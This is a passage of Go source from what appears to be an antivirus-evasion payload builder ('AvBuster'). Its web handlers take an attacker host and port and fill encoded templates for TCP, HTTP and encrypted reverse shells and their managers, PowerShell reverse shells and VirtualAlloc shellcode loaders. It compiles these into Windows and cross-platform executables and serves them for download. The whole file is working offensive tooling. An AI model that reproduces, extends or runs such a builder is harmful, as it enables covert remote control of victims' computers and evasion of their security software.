	result := base64.StdEncoding.EncodeToString(zipbuffer.Bytes())
	return result
}

func avbusterbuildpscsharpconsole(finflag chan string, exepath, csfilepath string, isGui bool) {
	dllpath := "outfiles" + string(os.PathSeparator) + "System.Management.Automation.dll"

	if runtime.GOOS == "linux" {
		cscpath, _ := exec.LookPath("mono-csc")
		fmt.Println(cscpath)
		cscargs := []string{`-r:` + dllpath, `/target:exe`, `-out:` + exepath, csfilepath}
		if isGui {
			cscargs = []string{`-r:` + dllpath + ",System.Windows.Forms.dll,System.Data,System.Drawing.dll", `/target:winexe`, `-out:` + exepath, csfilepath}
		}

		cmd := exec.Command(cscpath, cscargs...)
		res, err := cmd.CombinedOutput()
		fmt.Println(string(res))
		fmt.Println(cscargs)
		fmt.Println(exepath)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("Build Success !")
		}

	} else {
		fmt.Println("building exe.....")

		cscpath := `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`
		//cscpath := `C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe`
		exepath, _ = filepath.Abs(exepath)
		csfilepath, _ = filepath.Abs(csfilepath)
		cscargs := []string{`/r:` + dllpath, `/target:exe`, `-out:` + exepath, csfilepath}

		if isGui {
			cscargs = []string{`/r:` + dllpath, `/target:winexe`, `-out:` + exepath, csfilepath}
		}
		cmd := exec.Command(cscpath, cscargs...)
		res, err := cmd.CombinedOutput()
		fmt.Println(string(res))

		fmt.Println(cscargs)
		fmt.Println(exepath)
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("Build Success !")
		}
	}
	finflag <- "Build Success"

}
func (currentuservals *UserValues) processhybridencrypt(req *http.Request) {
	var archtype, controllerarchtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	ostype := strings.ToLower(req.Form.Get("ostype"))
	if req.Form.Get("archtype") == "32" {
		archtype = "386"
	} else {
		archtype = "amd64"
	}

	controlleros := strings.ToLower(req.Form.Get("cntostype"))

	if req.Form.Get("cntarchtype") == "32" {
		controllerarchtype = "386"
	} else {
		controllerarchtype = "amd64"
	}

	pvtkey := req.Form.Get("pvtkey")
	pubkey := req.Form.Get("pubkey")
	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = ostype
	currentuservals.targetarchitecture = archtype
	currentuservals.controlleros = controlleros
	currentuservals.controllerachitecture = controllerarchtype

	currentuservals.saveas = saveas
	currentuservals.privatekey = pvtkey
	currentuservals.publickey = pubkey

	outpath = "outfiles" + string(os.PathSeparator) + `hybridrev.go`
	manageroutpath = "outfiles" + string(os.PathSeparator) + "hybridrevshellmanager.go"
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterTCPHybridReverseShell)
	fmt.Println("building hybrid revshell")
	currentuservals.createavbusterpayload(false, false)
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterTCPHybridReverseShellManager)
	currentuservals.createavbusterpayload(true, false)

	os.Remove(outpath)
	os.Remove(manageroutpath)
}

func (currentuservals *UserValues) processhttprevshell(req *http.Request) {
	var controllerarchtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}
	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	targetos := req.Form.Get("ostype")
	architecture := req.Form.Get("archtype")

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = strings.ToLower(targetos)
	if architecture == "32" {
		currentuservals.targetarchitecture = "386"
	} else {
		currentuservals.targetarchitecture = "amd64"

	}
	controlleros := strings.ToLower(req.Form.Get("cntostype"))
	if req.Form.Get("cntarchtype") == "32" {
		controllerarchtype = "386"
	} else {
		controllerarchtype = "amd64"
	}

	currentuservals.controlleros = controlleros
	currentuservals.controllerachitecture = controllerarchtype
	currentuservals.saveas = saveas
	//fmt.Println(apptype)

	outpath = `outfiles` + string(os.PathSeparator) + `httprevshell.go`
	manageroutpath = `outfiles` + string(os.PathSeparator) + `httprevshellmanager.go`
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterHttpReverseShell)
	fmt.Println("building http revshell")
	currentuservals.createavbusterpayload(false, false)
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterHttpReverseShellManager)
	currentuservals.createavbusterpayload(true, false)

	os.Remove(outpath)
	os.Remove(manageroutpath)
}

func (currentuservals *UserValues) processnormalrevtcp(req *http.Request) {
	var targetarchtype, controllerarchtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	targetostype := "windows"
	targetarchtype = "386"

	controlleros := "windows"
	controllerarchtype = "386"

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = targetostype
	currentuservals.targetarchitecture = targetarchtype
	currentuservals.controlleros = controlleros
	currentuservals.controllerachitecture = controllerarchtype

	currentuservals.saveas = saveas

	outpath = `outfiles` + string(os.PathSeparator) + `normaltcp.cs`
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterSimpleRevShell)
	fmt.Println("building customdotnet revshell")
	currentuservals.createavbusterpayload(false, true)

	os.Remove(outpath)
}

func (currentuservals *UserValues) processcustomdotnet(req *http.Request) {
	var targetarchtype, controllerarchtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	targetostype := "windows"
	targetarchtype = "386"

	controlleros := "windows"
	controllerarchtype = "386"

	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = targetostype
	currentuservals.targetarchitecture = targetarchtype
	currentuservals.controlleros = controlleros
	currentuservals.controllerachitecture = controllerarchtype

	currentuservals.saveas = saveas

	outpath = `outfiles` + string(os.PathSeparator) + `customdotnet.cs`
	manageroutpath = "outfiles" + string(os.PathSeparator) + "customdotnet.cs"
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomCSharpRevShellClient)
	fmt.Println("building customdotnet revshell")
	currentuservals.createavbusterpayload(false, true)
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomCSharpRevShellManager)
	currentuservals.createavbusterpayload(true, true)

	os.Remove(outpath)
	os.Remove(manageroutpath)
}

func (currentuservals *UserValues) processcustomgo(req *http.Request) {
	var targetarchtype, controllerarchtype string
	err := req.ParseForm()
	checkerror(err)
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	targetostype := strings.ToLower(req.Form.Get("ostype"))
	if req.Form.Get("archtype") == "32" {
		targetarchtype = "386"
	} else {
		targetarchtype = "amd64"
	}
	controlleros := strings.ToLower(req.Form.Get("cntostype"))
	if req.Form.Get("cntarchtype") == "32" {
		controllerarchtype = "386"
	} else {
		controllerarchtype = "amd64"
	}
	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.targetos = targetostype
	currentuservals.targetarchitecture = targetarchtype
	currentuservals.controlleros = controlleros
	currentuservals.controllerachitecture = controllerarchtype

	currentuservals.saveas = saveas

	outpath = `outfiles` + string(os.PathSeparator) + `customgorev.go`
	manageroutpath = "outfiles" + string(os.PathSeparator) + "customgorevshellmanager.go"
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomGoReverseShell)
	fmt.Println("building customgo revshell")
	currentuservals.createavbusterpayload(false, false)
	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterCustomGoReverseShellManager)
	currentuservals.createavbusterpayload(true, false)

	os.Remove(outpath)
	os.Remove(manageroutpath)
}

func (currentuservals *UserValues) processpsrevshellbuild(req *http.Request) {
	saveas := req.Form.Get("saveas")
	if strings.TrimSpace(saveas) == "" {
		saveas = "noname"
	}

	lhost := req.Form.Get("lhost")
	lport := req.Form.Get("lport")
	apptype := req.Form.Get("shelltype")
	//currentuservals := UserValues{}
	currentuservals.lhost = lhost
	currentuservals.lport = lport
	currentuservals.apptype = apptype
	currentuservals.targetos = "windows"
	currentuservals.targetarchitecture = "386"
	currentuservals.saveas = saveas

	if apptype == "Console" {
		outpath = "outfiles" + string(os.PathSeparator) + "powrevtcp.cs"
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPowerShellTCPReverseShellCS)
		fmt.Println("building psrevshell")
		currentuservals.createavbusterpayload(false, true)

	} else {
		outpath = "outfiles" + string(os.PathSeparator) + "psrevgui.cs"
		currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPowerShellTCPReverseShellGUI)
		fmt.Println("building GUI psrevshell")
		currentuservals.createavbusterGUIpayload(false)
	}

	os.Remove(outpath)
}

func startserver() {
	router := mux.NewRouter()
	router.HandleFunc("/", avbusterhomepage)

	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
	router.PathPrefix("/static/logo/").Handler(http.StripPrefix("/static/logo/", http.FileServer(http.Dir("static/logo/"))))

	router.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
	router.PathPrefix("/outfiles/").Handler(http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))

	srv := &http.Server{
		Handler: router,
		Addr:    "0.0.0.0:8085",
		// Good practice: enforce timeouts for servers you create!
		WriteTimeout: 180 * time.Second,
		ReadTimeout:  180 * time.Second,
	}
	srv.ListenAndServe()
}

func fillappconfig() {
	apifile, err := ioutil.ReadFile("config/appconfig.cfg")
	if err != nil {
		fmt.Println(err)
	}
	err = json.Unmarshal(apifile, &appconfig)
	if err != nil {
		fmt.Println(err)
	}

}

func buildrevshellexe(exepath, gofilepath, ostype, arch string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		//fmt.Println("About to build " + gofilepath)
		//to do implement architecture base binary build
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}

func buildexe(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}

func buildrevshellexeforpscript() {
	cmd := exec.Command("go", "build", "-o", "download/rev.exe", "outfiles/rev.go")
	err := cmd.Start()
	cmd.Wait()
	if err != nil {
		fmt.Println(err)

	}
	//finflag <- "exe generated"
}

func shellexeccompress(source string) []byte {
	w, _ := flate.NewWriter(nil, 7)
	buf := new(bytes.Buffer)
	w.Reset(buf)
	w.Write([]byte(source))
	w.Close()
	return buf.Bytes()
}

func readandreplacefilecontent(ipport string) string {
	baseframefile, err := os.Open("basefiles/encode.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	/*newgoFile, err := os.Create("outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()*/
	filestring := ""
	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "IP:PORT") {
			//fmt.Println(str)
			str = strings.Replace(str, "IP:PORT", ipport, 1)
		}
		filestring += str
		filestring += "\n"
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}
	return filestring
}

func createpsrevgofile() {
	baseframefile, err := os.Open("basefiles/psrevcmd.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createpsvallocgofile() {
	baseframefile, err := os.Open("basefiles/psvalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("outfiles/psvalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createencodepsvallocgofile() {
	baseframefile, err := os.Open("basefiles/psencodevalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("outfiles/psencodevalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createencodedpsvirtualallocpayload(shellcode, saveas string) {
	file, err := os.Open("basefiles/vallocencode.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/vallocencode.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODE") {
			str = strings.Replace(str, "SHELLCODE", shellcode, 1)
		}
		newFile.WriteString(str + "\n")
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createencodepsvallocgofile()
	buildexe("download/"+saveas+".exe", "outfiles/psencodevalloc.go")
}

func createpsvirtualallocpayload(rhost, rport, shellcode, saveas string) {
	file, err := os.Open("basefiles/virtualalloc.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/psvalloc.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODE") {
			str = strings.Replace(str, "SHELLCODE", shellcode, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createpsvallocgofile()
	buildexe("download/"+saveas+".exe", "outfiles/psvalloc.go")
}

// creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
func creategopayload(ipandport, basefilepath, outfilepath, downloadlink, sourcefilelink, ostype, archtype, fprint string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		if strings.Contains(str, "FPRINT") {
			str = strings.Replace(str, "FPRINT", fprint, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	if ostype != "" && archtype != "" {
		//fmt.Println("bulding " + downloadlink)
		//fmt.Println("buiulding " + sourcefilelink)
		buildrevshellexe(downloadlink, sourcefilelink, ostype, archtype)
	} else {
		buildexe(downloadlink, sourcefilelink)
	}
}

func copyfile(sourcepath, destpath string) {
	srcpubkfile, err := os.Open(sourcepath)
	if err != nil {
		fmt.Println(err)
	}
	defer srcpubkfile.Close()
	newpubkFile, err := os.Create(destpath)
	if err != nil {
		fmt.Println(err)
	}
	defer newpubkFile.Close()

	scanner := bufio.NewScanner(srcpubkfile)
	for scanner.Scan() {
		str := scanner.Text()

		newpubkFile.WriteString(str + "\n")
	}

	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func createrevgoshell(revshellfilepath, outfilepath, port string, copycerts bool) {
	if copycerts {
		copyfile("manager/server.crt", "download/server.crt")
		copyfile("manager/server.key", "download/server.key")
	}

	file, err := os.Open(revshellfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVPRT") {
			str = strings.Replace(str, "REVPRT", port, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	//buildexe("download/"+"tcprev"+".exe", "outfiles/rev.go")

	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		execargs = "go build -o download/tcprev " + outfilepath

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		//cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Server is ready !")
		}
	} else {
		//fmt.Println("About to build " + gofilepath)
		cmd := exec.Command("go", "build", "-o", "download/tcprev.exe", outfilepath)
		err := cmd.Start()
		//cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Server is ready !")
		}
	}

}

func creategorevhttppayload(ipandport string) {
	file, err := os.Open("basefiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
}
func createpsrevshellpayload(rhost, rport, saveas string) {
	file, err := os.Open("basefiles/psrevcmd.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/revpshell.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "IPADDRHERE") {
			str = strings.Replace(str, "IPADDRHERE", rhost, 1)
		} else if strings.Contains(str, "PORTHERE") {
			str = strings.Replace(str, "PORTHERE", rport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createpsrevgofile()
	buildexe("download/"+saveas+".exe", "outfiles/rev.go")
	//buildrevshellexeforpscript()
	//finflag <- "finished pscriptexe"
}
